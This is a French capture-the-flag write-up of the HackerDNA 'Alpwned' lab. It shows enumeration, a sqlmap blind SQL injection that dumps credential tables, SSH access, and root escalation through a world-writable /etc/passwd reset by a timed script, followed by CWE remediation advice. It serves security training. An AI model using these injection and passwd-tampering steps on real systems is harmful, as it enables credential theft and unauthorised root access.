# WriteUp : Alpwned

**Plateforme :** HackerDNA  (https://hackerdna.com/fr/labs/alpwned)

**Catégorie :**  SQL Injection: Privilege Escalation: File Permissions   
**Difficulté :** Moyen   
**Tags :** `Web Application Security` `SQL Injection` `SSH` `Linux Privilege Escalation` `Authentication Bypass` `File Permissions` 

---

## Scénario

Le laboratoire simule une intrusion via une application web mal sécurisée. Les failles principales résident dans les bases SQLite et un fichier d'execution mal sécurisé avec une contrainte temps.

---

## Chaîne d'Attaque
`[Reconnaissance & Énumération]` ➔ `[Analyse du Point d'Entrée]` ➔ `[Injection SQL]` ➔ `[Connection SSH]` ➔ 🚩 ➔ `[Permission Fichier]` ➔ `[Escalade de Privilège Linux]` ➔ 🚩

---

## Étape 1: Reconnaissance & Énumération

La **reconnaissance Web** identifie un dashboard accessible avec login / mot de passe. Une énumération via gobuster confirme l'existence d'une application Web "dashboard".

```bash
gobuster dir -u $IP -w wordlist.txt
login                (Status: 200) [Size: 10546]
dashboard            (Status: 302) [Size: 199] [--> /login]
about                (Status: 200) [Size: 14194]
contact              (Status: 200) [Size: 14607]
console              (Status: 400) [Size: 167]
dashboard            (Status: 302) [Size: 199] [--> /login]
login                (Status: 200) [Size: 10546]
logout               (Status: 302) [Size: 189] [--> /]
```

La **reconnaissance des en-têtes** donne aussi des informations sur le serveur.

```bash
curl -I $IP
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.11
```

L'**énumération initiale** cible les services HTTP exposés et identifie la surface d'attaque.

```bash
nmap $IP
```

Résultat : deux ports TCP ouverts. Le port 80 (HTTP standard) et le port 22 (SSH).

---

## Étape 2: Analyse du point d'entrée & Injection SQL

La page de login du site mentionne la possibilité de se connecter avec `username=guest` et `password=guest`pour une démonstration du service. 

L'analyse de l'application web via SQLMap avec les informations serveurs et ces identifiants (`req.txt`) permet d'identifier l'existence de 3 tables sqlite.

```bash
sqlmap -r req.txt --technique=B --dbms=SQLite --tables --batch

[3 tables]
+-----------------+
| table1          |
| table2          |
| table3          |
+-----------------+
```
_Note: Les noms réels des tables sont volontairement cachés pour ne pas dévoiler trop facilement les réponses._

**Réflexe audit :** vérifier que les données sensibles ne peuvent pas être extraites via les fonctionnalités applicatives exposées et que les contrôles d'accès sont effectivement appliqués côté serveur.

Une fois le nom des tables trouvés, l'option `dump` permet d'en dévoiler le contenu.

```bash
sqlmap -r req.txt --technique=B --dbms=SQLite -T TABLENOM --dump : batch
```

Les tables nous révèlent les noms et mots de passe pour `guest` et `admin`. Il est désormais possible de se connecter au dashboard où les identifiants de connexions SSH sont lisibles.
_Note : une autre table nous donne également cette information._

Une fois connecté, il suffit de lire le fichier flag-user.txt.

🚩 Flag User

---

## Étape 3: Permission Fichier

Une fois connecté, la recherche des droits sudo montre l'impossibilité de se connecter à root via l'user ctf; en explorant les permissions, on découvre l'utilisation de l'utilitaire busybox.

```bash
ip-10-0-1-175:/$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chage
/usr/bin/expiry
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/bin/busybox
```

La recherche des processus donne un certain nombre d'indices supplémentaires : `{setup.sh} /bin/sh /root/setup.sh` et `sleep 5`.

```bash
PID   USER     TIME  COMMAND
    1 root      0:00 python3 /app/server.py
    7 root      0:00 [setup.sh]
    8 root      0:00 [sshd]
   10 root      0:00 {setup.sh} /bin/sh /root/setup.sh
   12 root      0:00 [sshd]
   13 root      0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
   14 root      0:01 /usr/bin/python3 /app/server.py
   41 ctf       0:06 [sh]
41876 root      0:00 [su]
43737 ctf       0:00 [sh]
43873 root      0:00 sshd-session: ctf [priv]
43884 ctf       0:00 sshd-session: ctf@pts/0
43885 ctf       0:00 -sh
43889 root      0:00 sleep 5
43890 ctf       0:00 ps aux
```
En continuant l'exploration des processus, on découvre que tout le monde peut écrire dans `/etc/passwd`.

```bash
-rw-rw-rw-    1 root     root           737 Jun 23 21:27 /etc/passwd
```

**Réflexe audit :** vérifier si les droits accés aux dossiers d'authentification sont bien limités.

---

## Étape 4: Escalade de privilège Linux

Les indices découverts tendent vers une élévation des droits via la création d'un nouvel utilisateur et mot de passe dans `/etc/passwd`avec une condition temps qui réécrit le fichier toutes les 5 secondes.

```bash
ip-10-0-2-142:/$ echo 'AAAAA' >> /etc/passwd
ip-10-0-2-142:/$ tail -2 /etc/passwd
ctf:x:1000:1000: /home/ctf:/bin/sh
AAAAA
ip-10-0-2-142:/$ sleep 10

ip-10-0-2-142:/$ tail -2 /etc/passwd
nobody:x:65534:65534:nobody:/:/sbin/nologin
ctf:x:1000:1000: /home/ctf:/bin/sh
```
Si AAAAA disparaît après quelques secondes, alors setup.sh remet le fichier dans son état initial. 

Il manque encore une information: le format de hachage attendu par le mécanisme d'authentification du système.

```bash
ip-10-0-4-248:~$ cd /usr/bin
ip-10-0-4-248:/usr/bin$ ls -la
total 10860
lrwxrwxrwx    1 root     root            12 Jul 15  2025 mkfifo -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jul 15  2025 mkpasswd -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Jul 15  2025 nc -> /bin/busybox
```
L'utilitaire Linux mkpasswd sert principalement à générer des hashes de mots de passe compatibles avec les mécanismes d'authentification Unix/Linux.

Le payload exploite la fenêtre de vulnérabilité entre deux réinitialisations du fichier. L'idée est d'injecter en boucle une nouvelle entrée dans /etc/passwd: formatée avec les champs adéquats pour obtenir les privilèges root: tout en tentant immédiatement de basculer sur ce nouvel utilisateur.
La contrainte temps impose de combiner l'écriture et l'élévation dans la même commande, sans quoi le fichier sera réécrit avant que la connexion n'aboutisse.
Une fois le bon format d'entrée trouvé et le hash généré avec l'utilitaire disponible sur le système, l'accès root est obtenu et le flag final est lisible.

Le flag s'affiche alors.

🚩 Flag Root

---

## Analyse GRC: Recommandations

| Risque | CWE | Impact | Recommandation |
|---|---|---|---|
|  Injection SQL sur l'application web  | CWE-89  | Accès non autorisé aux données, contournement d'authentification, extraction de secrets | Utiliser des requêtes préparées, validation des entrées, tests SAST/DAST réguliers et revue de code sécurisée  |     
| Exposition d'informations sensibles dans la base SQLite | CWE-200 | Divulgation d'identifiants applicatifs et système  | Chiffrer les données sensibles, limiter les privilèges d'accès aux bases et appliquer une politique de gestion des secrets  |                      |
| Permissions excessives sur `/etc/passwd`   | CWE-732 | Escalade de privilèges jusqu'à root  | Restreindre les permissions aux seuls comptes administrateurs et mettre en place une surveillance des modifications des fichiers critiques |

---

## Leçons Apprises

- **Protéger les mécanismes d'authentification contre les injections SQL et limiter l'exposition des données d'identité :** La découverte des tables de base de données utilisateurs est l'étape qui rend l'exploitation possible; sans elle, la surface d'attaque reste invisible.   
- **Vérifier les droits d'écriture de tous les fichiers de processus  :** La reconnaissance des processus et des fichiers exécutables utilisés ont permis d'accèder à root.  
- **Ne jamais stocker des identifiants système dans une application web :** Les credentials SSH exposés dans le dashboard illustrent un anti-pattern classique : la frontière entre couche applicative et couche système n'est pas respectée. Un attaquant qui compromet l'application ne devrait jamais pouvoir pivoter directement vers l'infrastructure sous-jacente. 
- **L'utilisation de scripts de remise à l'état initial est une protection insuffisante :** Une fenêtre de réinitialisation de 5 secondes est largement exploitable. La vraie correction reste de supprimer la permission d'écriture, pas de la corriger en boucle.

---

## License

Original analysis © Solène Figueiredo.

Licensed under **CC BY 4.0**.

Challenge names and any third-party intellectual property remain the property of their respective owners.